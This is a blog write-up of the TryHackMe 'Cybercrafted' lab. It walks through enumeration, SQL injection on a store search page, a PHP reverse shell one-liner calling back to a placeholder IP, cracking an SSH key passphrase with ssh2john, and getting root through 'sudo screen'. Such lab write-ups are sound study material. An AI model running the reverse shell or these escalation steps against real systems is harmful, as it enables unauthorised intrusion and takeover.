# TRYHACKME — CYBERCRAFTED

Cybercrafted is a medium difficulty room on tryhackme,
its description :- Pwn this pay-to-win Minecraft server!

---

### TRYHACKME — CYBERCRAFTED

![](https://cdn-images-1.medium.com/max/800/1*TB8CvXnrO8OIo9hanH3Q3Q.png)

Cybercrafted is a medium difficulty room on tryhackme,  
its description :- Pwn this pay-to-win Minecraft server!

starting with a basic nmap scan

![](https://cdn-images-1.medium.com/max/800/1*wQIoPTThUVG1pOQt2IdzIg.png)

we see 3 open ports :-

22 — ssh

80 — http

and an usual port 25565 — minecraft 1.7.2

Answer 1 :- 3 ports

Answer 2 :- Minecraft

also, add cybercrafted.thm to /etc/hosts file.  
visiting port 80 on the server we see this page

![](https://cdn-images-1.medium.com/max/800/1*GynSx2sg_AicX6TpdjJzIQ.png)

there’s nothing interesting on this page, but in its source we can see it hints towards subdomain enumeration (the question asks the same too).

![](https://cdn-images-1.medium.com/max/800/1*SvwtBqSzeWTwTsLNgcPllw.png)

anddd, we find 3 subdomainds

admin.cybercrafted.thm

store.cybercrafted.thm

[www.cybercrafted.thm](http://www.cybercrafted.thm)

Answer 3 :- admin store www

add these to your /etc/hosts file too.

now we can start with performing dirbusting on these subdomains.

![](https://cdn-images-1.medium.com/max/800/1*OVHJsUzYkj_m_3p8qVhd0g.png)![](https://cdn-images-1.medium.com/max/800/1*XEMOJNr7pmwOzg7IbYRYyA.png)

aaha, search.php on store subdomain.

![](https://cdn-images-1.medium.com/max/800/1*z1gjyEHZg5Y8I-fgiE1kAg.png)

we can probably test for sqli on this search field.

anddd we got it!

![](https://cdn-images-1.medium.com/max/800/1*JJ2fe96W4YHIWbKrVGNVcw.png)

now we can login to the admin page.

![](https://cdn-images-1.medium.com/max/800/1*g46hPqavrexQZbNP1UjTtQ.png)

here i used a basic php rev shell

php -r ‘$sock=fsockopen(“your\_ip”,1234);exec(“/bin/sh -i <&3 >&3 2>&3”);’

andd got a shell

![](https://cdn-images-1.medium.com/max/800/1*kszAM423x9NTwM5ZS7uUFQ.png)

coming to home directory, we have 2 users and we can access ‘xxultimatecreeperxx’s ssh directory, we copy the id\_rsa and paste into our machine, when i tried to use it to login, it asked for passphrase.

i decided to use ssh2john

![](https://cdn-images-1.medium.com/max/800/1*-QEHc7M5TdXwxQji6A_M7g.png)

now we use it login through ssh.

![](https://cdn-images-1.medium.com/max/800/1*-yCK77UZkiYfmmPW01Mezw.png)

now looking for minecraft flag using find.

![](https://cdn-images-1.medium.com/max/800/1*SwAa9kjQmh64oVSFZDgAzw.png)![](https://cdn-images-1.medium.com/max/800/1*OjuCG0eRXGkm92wQPj5HUA.png)

we can also find a note in the same directory as the flag

![](https://cdn-images-1.medium.com/max/800/1*p5HEvx2rKOLwfYotQMGuNQ.png)

this suggests that there is something we wanna do related to plugins

![](https://cdn-images-1.medium.com/max/800/1*axbmd6tOZvV9bWb4GBhAcQ.png)

and boom, with some enumeration we can find password for the user cybercrafted.

now going for the root we see this,

![](https://cdn-images-1.medium.com/max/800/1*fOrNlRgdphhhuiMwxYSghQ.png)

after some research, i found out that if you run

sudo screen -r cybercrafted

and then press ctrl+a+c, you get a root shell.

![](https://cdn-images-1.medium.com/max/800/1*dzmZfzjGmHfa3ju56jVHOQ.png)

Thanks for reading!

By [Lightningfst](https://medium.com/@lightningfst8) on [July 11, 2026](https://medium.com/p/de836a93dc35).

[Canonical link](https://medium.com/@lightningfst8/tryhackme-cybercrafted-de836a93dc35)

Exported from [Medium](https://medium.com) on August 8, 2026.
